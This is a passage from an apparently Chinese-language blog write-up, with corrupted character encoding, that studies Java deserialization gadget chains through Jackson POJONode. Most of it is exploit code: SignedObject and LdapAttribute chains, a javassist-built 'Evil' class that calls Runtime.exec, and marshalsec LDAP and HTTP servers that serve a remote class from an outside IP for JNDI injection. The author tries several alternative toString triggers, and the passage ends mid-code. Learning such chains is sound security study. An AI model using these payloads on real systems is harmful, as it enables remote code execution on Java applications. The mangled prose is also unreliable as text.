Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); POJONode node = new POJONode(signedObject); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, node); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } â€”â€”â€”â€”â€”â€”â€”â€”\nLdapAttributeé“¾ è¿™ä¸ªç±»ä½äºcom.sun.jndi.ldap.LdapAttributeï¼Œè¿™æ˜¯ä¸€ä¸ªdefaultå±æ€§çš„ç±»ï¼Œä¸èƒ½ç›´æ¥å¯¼å…¥ï¼Œåå°„è·å–å³å¯ï¼Œè¿™ä¸ªç±»æœ‰getteræ–¹æ³•å¯ä»¥è¿›è¡Œjndiæ³¨å…¥ï¼š\nè¿™é‡Œå°±ä»payloadæ¥å­¦ä¹ ä¸€ä¸‹è¿™ä¸ªçš„ä½¿ç”¨æ–¹æ³•(æœ‰å°tipsï¼Œå…·ä½“çœ‹åé¢æ€ä¹ˆæ‰“)ï¼Œå…ˆè¯´æ‰“æ³•ï¼Œå†ç®€å•è®²è®²è¿™é‡Œçš„è¿‡ç¨‹ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°marshalsecå·¥å…·ï¼Œç„¶ååœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šè¿è¡ŒjaråŒ…æ¥ç”ŸæˆæœåŠ¡å™¨ï¼š\n1 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026#34;http://47.100.223.173:2333/#a\u0026#34; 1389 ç„¶åå¼€ä¸€ä¸ªpythonçš„httpæœåŠ¡ï¼š\n1 python3 -m http.server 2333 æ³¨æ„åœ¨pythonçš„httpæœåŠ¡çš„å½“å‰ç›®å½•ä¸‹æ”¾å¼¹è®¡ç®—æœºçš„classæ–‡ä»¶ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\nç„¶åè¿è¡Œä¸‹é¢è¿™ä¸ªä»£ç å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javax.management.BadAttributeValueExpException; import javax.naming.CompositeName; import java.io.*; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main( String[] args ) throws Exception { //åˆ å»å½±å“POJONodeåºåˆ—åŒ–çš„ç±» ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.get(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); ctClass.removeMethod(ctMethod); ctClass.toClass(); String ldapCtxUrl = \u0026#34;ldap://47.100.223.173:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(String.class); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(\u0026#34;fupanc\u0026#34;); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); POJONode jsonNodes = new POJONode(ldapAttribute); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;).getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(exp,jsonNodes); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); oos.writeObject(exp); oos.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ois.readObject(); ois.close(); } } è¿™æ ·å°±å¯ä»¥åœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºã€‚\nåˆ†æè¿‡ç¨‹å°±ç®€å•è¯´è¯´å§ï¼Œè¯¦ç»†çš„å¯ä»¥å»ç½‘ä¸Šæ‰¾æ–‡ç« çœ‹ï¼š\nä¸Šé¢ä¸»è¦çš„ä¸€ä¸ªä¸åŒç‚¹å°±åœ¨äºldapçš„urlæ²¡æœ‰å†™æˆldap://xxxx/xxxï¼Œä¹Ÿå°±æ˜¯åé¢æ²¡æœ‰åŠ è¯·æ±‚çš„codebaseé‚£äº›äº†ï¼Œè¿™é‡Œæ˜¯å› ä¸ºpayloadä¸­ä¼šçš„a//bä¼šåœ¨è¯·æ±‚æ—¶ä¼šè‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªaï¼Œå¦‚ï¼š\nè¿™ä¸ªä¸»è¦æ˜¯ç”±payloadé€ æˆçš„ï¼Œè¿™é‡Œä¹Ÿå°±ä¸å¤šè¯´äº†ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨åˆ°marshalsecå·¥å…·ï¼Œä¸ªäººç†è§£å°±æ˜¯ç›´æ¥è¿”å›ä¸€ä¸ªè·¯å¾„è®©å…¶è®¿é—®æ‹¿classæ–‡ä»¶ï¼Œä¸ç®¡æ˜¯å‘é€ä»€ä¹ˆçš„è¯·æ±‚ï¼Œæ‰€ä»¥å…¶å®ç›´æ¥å°†a.classæ”¹æˆMyTest.classä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\næœ€åå…¶å®è°ƒè¯•åå¯ä»¥å‘ç°æˆåŠŸæ‰“jndiæ³¨å…¥æ˜¯åœ¨getSchema()æ–¹æ³•ä¸­ï¼Œæœ‰å…´è¶£çš„å¯ä»¥å†è°ƒè¯•è·Ÿä¸€ä¸‹è¿™é‡Œçš„ååºåˆ—åŒ–è¿‡ç¨‹ã€‚\nå…¶ä»–è§¦å‘toStringçš„ç±» è¿™é‡Œçš„çŸ¥è¯†ç‚¹å…¶å®æ›´å¤šçš„ç®—æ˜¯ä¸€ç§ç»•è¿‡ï¼Œåœ¨å‰é¢é“¾å­çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨toString()æ–¹æ³•ï¼Œéƒ½æ˜¯åˆ©ç”¨çš„BadAttributeValueExpExceptionæ¥è¿›è¡ŒtoString()æ–¹æ³•çš„è°ƒç”¨ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸ªç±»è¢«bandæ‰äº†å‘¢ï¼Œåˆè¯¥æ€ä¹ˆåˆ©ç”¨ï¼Œä¸‹é¢å°±æ¥å­¦ä¹ ä¸€ä¸‹å¦å¤–çš„å¯ä»¥è°ƒç”¨toString()æ–¹æ³•çš„ç±»ã€‚\nXStringForFSB è¿™ä¸ªç±»ä½äºcom.sun.org.apache.xpath.internal.objects.XStringForFSBï¼Œå…¶çˆ¶ç±»æ˜¯XStirngã€‚\nå…¶å®è¿™ä¸ªå’ŒROMEé“¾çš„HotSwappableTargetSourceé“¾æœ‰ç‚¹å…³è”ï¼Œåœ¨é‚£æ¡ROMEé“¾ä¸­ï¼Œæ˜¯é€šè¿‡HotSwappableTargetSourceè°ƒç”¨åˆ°XStringçš„çš„equals()æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨åˆ°ä»»æ„ç±»çš„toString()æ–¹æ³•ã€‚\nè¿™é‡Œçš„XStringForFSBç±»çš„equals()æ–¹æ³•åŒæ ·å¯ä»¥è°ƒç”¨åˆ°ä»»ä½•ç±»çš„toString()æ–¹æ³•ï¼š\næ‰€ä»¥è¿˜æ˜¯å¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­ç»§é“¾æ¥è°ƒç”¨åˆ°ä»»æ„ç±»çš„toString()æ–¹æ³•ã€‚\nè¿™é‡Œçš„ç›®çš„æ˜¯è°ƒç”¨åˆ°XStringForFSBç±»çš„equals()æ–¹æ³•ï¼Œæœ€ç»å…¸çš„å°±æ˜¯è¿˜æ˜¯Hashtbaleäº†ï¼Œä¹Ÿæ¯”è¾ƒå®¹æ˜“çœ‹ï¼Œè¿™é‡Œæ¥å°è¯•æ„é€ ä¸€ä¸‹ï¼Œä½¿ç”¨ä¸¤ä¸ªHashMapï¼Œå‚è€ƒROMEé“¾çš„equalsé“¾ï¼Œä¸»è¦çš„è§¦å‘ç‚¹åœ¨AbstractMapç±»çš„equals()æ–¹æ³•ï¼š\nè€ç”Ÿå¸¸è°ˆçš„æ–¹æ³•äº†ï¼Œç®€å•æ„é€ ä¸€ä¸‹ï¼Œè¿™é‡Œæœ¬æ¥æƒ³é€‰ç”¨çš„æ„é€ å‡½æ•°ä¸ºï¼š\nåå°„è·å–å°±å¯ï¼Œä½†æ˜¯èµ‹å€¼å®Œå°±ä¸¢å‡ºå¼‚å¸¸ï¼Œè¡¨ç¤ºä¸èƒ½ä¸ºå­—ç¬¦ä¸²ï¼Œåªèƒ½æ”¾å¼ƒã€‚çœ‹å¦å¤–ä¸€ä¸ªæ„é€ å‡½æ•°ï¼š\nsuper()èµ‹å€¼å°±æ˜¯ä¸€ç›´å¾€ä¸Šè°ƒç”¨ï¼Œå…¶å®å°±æ˜¯ç»™çˆ¶ç±»çš„çˆ¶ç±»XObjectçš„å˜é‡èµ‹å€¼ï¼š\nè¿™ä¸ªå˜é‡å…¶å®æ˜¯XStringé“¾æåˆ°è¿‡çš„ï¼Œä½†è¿™é‡Œæ²¡å•¥ç”¨ã€‚ä»åŸå…ˆçš„é“¾å­ä¸­å¯ä»¥çœ‹å‡ºï¼Œéƒ½ä¸ä¼šåˆ©ç”¨åˆ°è¿™çš„å˜é‡ï¼Œé‚£ä¹ˆå°±å°è¯•åªå°†å…¶èƒ½æ­£å¸¸å®ä¾‹åŒ–ï¼Œè®©AIç»™ä¸€ä¸ªæ­£å¸¸å®ä¾‹åŒ–çš„ä»£ç ï¼Œç»æµ‹è¯•å¦‚ä¸‹å¯ç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package jackson; import com.sun.org.apache.xml.internal.utils.FastStringBuffer; import com.sun.org.apache.xpath.internal.objects.XStringForFSB; public class Text { public static void main(String[] args) { FastStringBuffer fsb = new FastStringBuffer(); fsb.append(\u0026#34;Hello, this is a sample string stored in FastStringBuffer!\u0026#34;); // 2. å®šä¹‰èµ·å§‹ä½ç½®å’Œæå–é•¿åº¦ int start = 7; // ä»ç¬¬8ä¸ªå­—ç¬¦å¼€å§‹ï¼ˆç´¢å¼•ä»0å¼€å§‹ï¼‰ int length = 10; // æå–10ä¸ªå­—ç¬¦ // 3. åˆ›å»º XStringForFSB å®ä¾‹ XStringForFSB xString = new XStringForFSB(fsb, start, length); System.out.println(xString); } } è¾“å‡ºä¸ºï¼š\n1 this is a è¾“å‡ºä¸ºè¿™ä¸ªä¸è¦ç´§ï¼Œåªè¦å®ƒæ˜¯è¿™ä¸ªç±»å®ä¾‹å³å¯ï¼š\né‚£ä¹ˆå°±å¯ä»¥å°è¯•æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.util.HashMap; import java.util.Hashtable; import com.sun.org.apache.xml.internal.utils.FastStringBuffer; import com.sun.org.apache.xpath.internal.objects.XStringForFSB; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //ä¿®æ”¹ç±»æ–¹æ³• CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //ä¹Ÿå¯ä»¥ç›´æ¥åˆ å»è¿™ä¸ªç±» ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); FastStringBuffer fsb = new FastStringBuffer(); fsb.append(\u0026#34;Hello, this is a sample string stored in FastStringBuffer!\u0026#34;); XStringForFSB stringForFSB = new XStringForFSB(fsb, 7, 10); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;yy\u0026#34;,stringForFSB); hashMap1.put(\u0026#34;zZ\u0026#34;,node); HashMap hashMap2 = new HashMap(); hashMap2.put(\u0026#34;yy\u0026#34;,node); hashMap2.put(\u0026#34;zZ\u0026#34;,stringForFSB); Hashtable table = new Hashtable(); table.put(hashMap1,\u0026#34;1\u0026#34;); table.put(hashMap2,\u0026#34;2\u0026#34;); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œå¹¶ä¸”é“¾å­ä¹Ÿæ˜¯ç¬¦åˆé¢„æœŸçš„ï¼Œé‚£ä¹ˆæ€ä¹ˆåªåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºé‡Œè®¡ç®—æœºå‘¢ï¼Ÿå…¶å®å¯ä»¥å‚è€ƒä¸‹é¢è¿™æ¡é“¾å­çš„ç»•è¿‡æ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œå¿½ç•¥äº†ä¸€ä¸ªéå¸¸é‡è¦çš„é—®é¢˜ï¼ŒFastStringBufferä¸å¯è¢«åºåˆ—åŒ–ï¼Œå¹¶ä¸”å®ƒè¿˜æ²¡æœ‰çˆ¶ç±»ï¼š\nè°ƒä¸åŠ¨äº†ï¼Œç•™ä¸ªå‘ç‚¹ã€‚\nTextAndMnemonicHashMap è¿™ä¸ªç±»ä½äºjavax.swing.UIDefaults$TextAndMnemonicHashMapï¼Œä¹Ÿå°±æ˜¯UIDefaultsç±»çš„ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œè¿™ä¸ªç±»çš„get()æ–¹æ³•ä¼šè§¦å‘toString()æ–¹æ³•ï¼š\nè°ƒç”¨getçš„è¯ï¼Œå°±ä¸å¾—ä¸æåˆ°HashMapç±»çš„è°ƒç”¨get()çš„æ–¹æ³•ï¼š\nåŒæ ·æ˜¯è°ˆäº†å¾ˆå¤šæ¬¡çš„è¿™ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆç°åœ¨æ§åˆ¶è¿™é‡Œçš„mä¸ºTextAndMnemonicHashMapç±»ï¼Œè¿™é‡Œçš„keyä¸ºPOJONodeç±»ï¼Œä½†æ˜¯è¿™ä¸ªTextAndMnemonicHashMapç±»æ˜¯ä¸€ä¸ªprivateå†…éƒ¨ç±»ï¼Œä¸èƒ½ç›´æ¥å¯¼å…¥ï¼Œåå°„è·å–å®ƒçš„æ„é€ æ–¹æ³•æ¥è¿›è¡Œåˆ›å»ºå³å¯ï¼Œç„¶åè¿™é‡Œè®©è¢«ç”¨æ¥åºåˆ—åŒ–çš„ç±»ä¸ºHashtableï¼Œå…¥å£å°±å¯ä»¥å‚ç…§CC7ï¼Œå…ˆæ˜¯ä¸€ä¸ªç®€å•çš„æ ¹æ®å‰é¢æå‡ºçš„è¦æ±‚æ¥è¿›è¡Œçš„æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //ä¿®æ”¹ç±»æ–¹æ³• CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //ä¹Ÿå¯ä»¥ç›´æ¥åˆ å»è¿™ä¸ªç±» ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Constructor constructor = Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Map text = (Map)constructor.newInstance(); HashMap hashMap1 = new HashMap(); hashMap1.put(node,\u0026#34;1\u0026#34;); Hashtable table = new Hashtable(); table.put(hashMap1,\u0026#34;1\u0026#34;); table.put(text,\u0026#34;1\u0026#34;); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è¿è¡Œæ˜¯æ²¡æœ‰å¼¹å‡ºè®¡ç®—æœºçš„ï¼Œé‚£ä¹ˆç°åœ¨å°±æ¥è€ƒè™‘ä¸€ä¸‹hashå€¼ç›¸åŒçš„é—®é¢˜ï¼Œå¯ä»¥ç›´æ¥ç”¨ä¸Šé¢çš„ä»£ç æ¥è°ƒè¯•ï¼Œé‡ç‚¹æ˜¯hashå€¼çš„è®¡ç®—ï¼Œå°±éƒ½æ‰“ä¸Šæ–­ç‚¹æ¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„hashå€¼è®¡ç®—æƒ…å†µï¼š\nå…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªæ”¾å…¥çš„hashMap1çš„è®¡ç®—æƒ…å†µï¼š\nä¼šè°ƒç”¨HashMapç±»çš„hashCode()æ–¹æ³•ï¼š\nç„¶åä¼šè°ƒç”¨åˆ°hashCode()æ–¹æ³•ï¼š\nä¹Ÿå°±æ˜¯è®¡ç®—é”®å€¼å¯¹çš„hashå€¼ç„¶åè¿›è¡ŒæŠ‘æˆ–çš„ä¸€ä¸ªæ“ä½œï¼Œç„¶åå°±é¡ºåˆ©æ”¾è¿›äº†è¿™ä¸ªé”®å€¼å¯¹ã€‚\nç¬¬äºŒæ¬¡put()æ˜¯æœ€é‡è¦çš„æ“ä½œï¼Œä¼šè¿›è¡Œhashå€¼æ˜¯å¦ç›¸ç­‰ç­‰ä¸€ç³»åˆ—è®¡ç®—ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼ŒåŒæ ·ä¼šè¿›å…¥åˆ°å¦‚ä¸‹çš„ä»£ç ï¼š\nå¦‚æœå­˜åœ¨é”®å€¼å¯¹çš„è¯ï¼Œå°±åŒæ ·ä¼šè¿›è¡Œå“ˆå¸Œå€¼çš„è®¡ç®—ï¼Œè¿™é‡Œä¹Ÿä¼šè°ƒç”¨è¿™ä¸ªçš„åŸå› åº”è¯¥æ˜¯å› ä¸ºTextAndMnemonicHashMapä¸å­˜åœ¨hashCode()æ–¹æ³•ï¼Œä½†æ˜¯å…¶çˆ¶ç±»æ˜¯HashMapç±»ï¼š\né‚£ä¹ˆæ˜¯å¦å¯ä»¥é€šè¿‡è®©å…¶é”®å€¼å¯¹éƒ½ç›¸åŒä»è€Œè®©hashå€¼ç›¸åŒå‘¢ï¼Œç›´æ¥åœ¨textä¸­æ”¾å…¥é”®å€¼å¯¹å°±è¡Œäº†:\n1 2 Map text = (Map)constructor.newInstance(); text.put(node,\u0026#34;1\u0026#34;); å†æ¬¡è°ƒè¯•ï¼Œå¦‚ä¸‹ï¼š\nç¡®å®å¯ä»¥ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯è€ƒè™‘æ˜¯å¦å¯ä»¥æ”¾å…¥ä¸¤ä¸ªé”®å€¼å¯¹çš„é—®é¢˜äº†ã€‚ç»§ç»­è·Ÿè¿›ï¼Œç¡®å®æˆåŠŸè°ƒç”¨åˆ°äº†equals()æ–¹æ³•ï¼Œä½†æ˜¯æ­¤æ—¶ç«Ÿç„¶æŠ¥äº†å¦‚ä¸‹çš„é”™è¯¯ï¼›\nç›´æ¥æ±‚å€¼äº†ï¼Ÿè¿™é‡Œè°ƒç”¨getKey()ä¼šå¯¹keyè¿›è¡Œä¸€æ¬¡è°ƒç”¨toString()æ–¹æ³•ï¼Ÿè·Ÿè¿›ä¸€ä¸‹getKey()çœ‹çœ‹å‘¢ï¼š\nè¿™é‡Œæ˜¯ç›´æ¥è¿”å›å€¼çš„æ“ä½œï¼Œéš¾é“æ˜¯å› ä¸ºè¿™é‡Œçš„kæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Ÿæˆ‘è¿™é‡Œä¼ å…¥çš„æ˜¯ä¸€ä¸ªç±»å®ä¾‹ï¼Œæ‰€ä»¥ä¼šè‡ªåŠ¨è°ƒç”¨åˆ°è¿™ä¸ªç±»çš„toString()æ–¹æ³•ï¼Œå¯¼è‡´äº†ä¸€æ¬¡è°ƒç”¨é“¾çš„æ‰§è¡Œï¼Ÿä½†æ˜¯åˆæœ‰æ—¶å€™å¼¹è®¡ç®—æœºäº†æœ‰æ—¶å€™æ²¡å¼¹ï¼ˆå¤§éƒ¨åˆ†æ—¶å€™æ²¡å¼¹ï¼‰\né‚£ä¹ˆè¿™é‡Œè¯¥æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿè¿™é‡Œæˆ‘æƒ³åˆ°äº†ä¸€ä¸ªç‚¹ï¼Œèƒ½å¦ç›´æ¥ä¿®æ”¹Hashtableä¸­çš„å­˜å‚¨è¡¨æ¥è¿›è¡Œåˆ©ç”¨ï¼Œæ¯”å¦‚è¿™é‡Œå…¶å®Hashtableå’ŒHashMapç­‰çš„å­˜å‚¨è¡¨éƒ½æ˜¯é€šè¿‡ä»–ä»¬çš„å†…ç½®ç±»Entryæ¥å®ç°çš„ï¼Œå¯ä»¥è·Ÿè¿›ä¸€ä¸‹put()æ–¹æ³•çš„åç»­ä»£ç :\nè·Ÿè¿›è¿™ä¸ªaddEntry()æ–¹æ³•ï¼š\nå°±æ˜¯ä¸€ä¸ªå®ä¾‹åŒ–Nodeçš„æ“ä½œã€‚æ‰€ä»¥å°±æ˜¯ç›´æ¥ä¿®æ”¹è¿™ä¸ªå­˜å‚¨è¡¨ï¼Œè€Œå­˜å‚¨è¡¨ä¸€èˆ¬éƒ½æ˜¯æ”¾åœ¨ç±»çš„tableå˜é‡ä¸­çš„ï¼š\nä½†æ˜¯è¿™é‡Œçš„åå°„è·å–åˆ°ç›¸å…³ç±»æ„é€ æ–¹æ³•æ²¡æå‡ºæ¥ï¼Œä¸ç„¶å°±åªæœ‰ä¸€ä¸ªä¸€ä¸ªå˜é‡è·å–åˆ°ç„¶åè¿›è¡Œä¿®æ”¹ã€‚å¹¶ä¸”å…¶å®è¿™ä¸ªç›´æ¥ä¿®æ”¹åœ¨è¿™ä¹Ÿæ˜¯æ²¡æœ‰ä»€ä¹ˆå¤§ç”¨çš„ï¼Œå°±ç®—åœ¨åºåˆ—åŒ–å‰ä¿®æ”¹äº†ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶åŒæ ·ä¼šæŠ¥è¿™ä¸ªé”™è¯¯ï¼ŒåŒæ ·ä¼šåœ¨getKey()æ–¹æ³•å¤„è°ƒç”¨åˆ°toString()æ–¹æ³•ã€‚\nå…¶å®å¦‚æœèƒ½ç¨³å®šå¼¹å‡ºè®¡ç®—æœºï¼Œè¿™æ ·ä¹Ÿç®—æ˜¯åœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºï¼Œåªæ˜¯ä¸æ˜¯æ ¹æ®é“¾å­è¿›è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰æ—¶å€™èƒ½å¼¹æœ‰æ—¶å€™å¼¹ä¸äº†ï¼Œåªèƒ½æ”¾å¼ƒã€‚\nè¿˜æ˜¯ä¸è¡Œå‘€ï¼Œçœ‹äº†ä¸€ä¸‹ç½‘ä¸Šçš„åˆ†ææ–‡ç« ï¼Œæ˜¯ç”¨çš„TextAndMnemonicHashMapç±»æ¥è°ƒç”¨åˆ°equals()æ–¹æ³•ï¼Œæ­£å¦‚å‰é¢è°ˆåˆ°è¿‡çš„ï¼Œè¿™é‡Œçš„TextAndMnemonicHashMapç±»çš„çˆ¶ç±»æ˜¯HashMapç±»ï¼Œæ‰€ä»¥è°ƒç”¨equals()æ–¹æ³•æ—¶ä¼šä¸€æ­¥ä¸€æ­¥å¾€çˆ¶ç±»æ‰¾ï¼Œæœ€åè¿˜æ˜¯ä¼šè°ƒç”¨åˆ°é¢„æœŸçš„equals()æ–¹æ³•ï¼Œä½†æ˜¯å…¶æœ¬è´¨å…¶å®éƒ½æ˜¯ç›¸åŒçš„ï¼Œå¯¹äºhashå€¼ç›¸åŒçš„é—®é¢˜åœ¨å‰é¢ä¹Ÿå·²ç»æ—©å°±è§£å†³ï¼Œå½“åŠ¡ä¹‹æ€¥è¿˜æ˜¯çœ‹å¦‚ä½•è§£å†³è‡ªåŠ¨è°ƒç”¨toString()æ–¹æ³•çš„é—®é¢˜ï¼Œæƒ³ä¸å‡ºæ¥ï¼Œä¹Ÿæ²¡è°ƒå‡ºæ¥ï¼Œçœ‹ä¸€ä¸‹ç½‘ä¸Šç°æœ‰çš„POCï¼Œç†è§£äº†ä¸€ä¸‹ï¼Œç„¶åæ”¹æˆè‡ªå·±å¸¸ç”¨çš„é£æ ¼ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import 